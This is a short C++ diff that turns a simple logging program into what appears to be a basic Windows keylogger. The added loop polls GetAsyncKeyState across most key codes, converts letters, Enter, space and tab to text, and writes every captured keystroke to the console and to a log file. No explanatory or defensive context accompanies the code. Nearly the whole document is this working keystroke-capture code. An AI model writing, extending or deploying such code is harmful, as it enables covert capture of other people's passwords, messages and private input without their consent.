@@ -1,5 +1,6 @@
 #include <iostream>
 #include <fstream>
+#include <windows.h>
 
 using namespace std;
 
@@ -13,7 +14,32 @@ void log(const string &text) {
     }
 }
 
+string key_to_string(int key){
+    if(key >= 'A' && key <= 'Z'){
+        return string(1, char(key));
+    }
+    switch(key){
+        case VK_RETURN: return "\n";
+        case VK_SPACE: return " ";
+        case VK_TAB: return "\t";
+        default: return "";
+    }   
+
+}
+
 int main(){
-    log("Starting the log...\n");
+    while(true){
+        for(int key = 8; key <= 190; key++){
+
+            // GetAsyncKeyState   --> 1000000000000000 & 0x01 
+            if(GetAsyncKeyState(key) & 0x01){
+                string keySTR = key_to_string(key);
+                if(!keySTR.empty()){
+                    cout << keySTR;
+                    log(keySTR);
+                }
+            }
+        }
+    }
     return 0;
 }
